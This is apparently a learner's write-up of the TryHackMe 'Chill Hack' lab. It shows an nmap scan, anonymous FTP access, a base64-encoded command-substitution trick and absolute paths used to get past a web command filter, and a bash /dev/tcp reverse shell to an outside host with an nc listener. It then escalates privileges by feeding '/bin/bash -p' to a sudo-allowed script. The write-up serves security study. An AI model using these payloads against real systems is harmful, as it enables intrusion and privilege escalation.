this is the result of nmap scan : 

///////////////

nmap -sC -sV 10.10.246.95             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 16:59 UTC
Nmap scan report for 10.10.246.95
Host is up (0.085s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.21.180.29
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Game Info
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.07 seconds

//////////////////////////////


we found an ftp service : 

lets capture the info : 

ftp 10.10.246.95
Connected to 10.10.246.95.
220 (vsFTPd 3.0.3)
Name (10.10.246.95:Abad): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 03  2020 .
drwxr-xr-x    2 0        115          4096 Oct 03  2020 ..
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> 

/////////////////////////////


this is what was inside note.txt: 

cat note.txt                      
Anurodh told me that there is some filtering on strings being put in the command -- Apaar

this may means we are dealing with a command-line filter that might be blocking certain strings, like |, ;, 
or even specific commands like nc, bash, etc., when trying to execute a reverse shell.

In this case, we will want to evade detection by using methods that bypass the filtering mechanisms

this is a url that i found using gobuster /secret               (Status: 301) [Size: 313] [--> http://10.10.246.95/secret/]

which seems suspicious :



ok in this url there is a cmnd prompt that forbidds cmnds like ls , and allow cmnds like echo etc ,,


so to execute our intentional mallicious cmnds , we need to inject them in a format that prints them as a encoded strings of char and decode them right away upon cmnd execution a valid exemple would be this format which is not blocked : 

            $(echo "d2hvYW1p" | base64 -d)

since this format will not be blocked and will decode and exectute the cmnd within lets use it 

but this works for just common cmnds and we wont get a reverse shell with it  , but since it doesnt block the cmnd if we include the binry folder like this 

/bin/ls 


we can try : /bin/bash -c 'bash -i >& /dev/tcp/10.21.180.29/4444 0>&1' 


and we will get a reverse shell like this : 

////////////////////////// 

✘  Fri  6 Jun - 01:08  ~/Desktop/work/tryhackme/chillhack   master 19☀ 2● 
 @Abad  nc -lnvp 4444         
Connection from 10.10.212.87:46586
bash: cannot set terminal process group (839): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-10-212-87:/var/www/html/secret$


/////////////////////// 


ok now after surching we found out that the this user may run some cmnds as another user :  using sudo -l 


///////////////// 

www-data@ip-10-10-14-199:/var/www/html/secret$ sudo -l
Matching Defaults entries for www-data on ip-10-10-14-199:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-14-199:
(apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh

/////////////////// 


this is whats inside the script : 

///////////////// 

cat .helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"


/////////////// 

so we see that it takes to inputs and executes one of them which is the second one : msg



but if we executed this the normal way using "sudo /home/apaar/.helpline.sh" it will ask us for a password 
Why might sudo /home/apaar/.helpline.sh ask for password despite NOPASSWD?

    Maybe the sudoers entry only allows running the script as apaar with sudo -u apaar.

    Or the sudoers file has a typo or requires specifying -u apaar explicitly.


so we will execute it this way by specifying the user : sudo -u apaar /home/apaar/.helpline.sh
and opening  a shell when the script asks for the second input so that we can excutes it , this is the cmnds that opens a shell 
and keeps the priviliges of the user apaar the we are trying to get its shell : 

like this 

//////////////// 
www-data@ip-10-10-14-199:/var/www/html/secret$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: admin
Hello user! I am admin,  Please enter your message: /bin/bash -p
/////////////////////  


and now when we check the user changed when we type 
///// 
whoami
apaar
//////// 

its neccessary befor doing this to stabilise the shell like this : 
///////////// 

python3 -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm  

CTRL+Z 

stty raw -echo; fg

///////////// 


























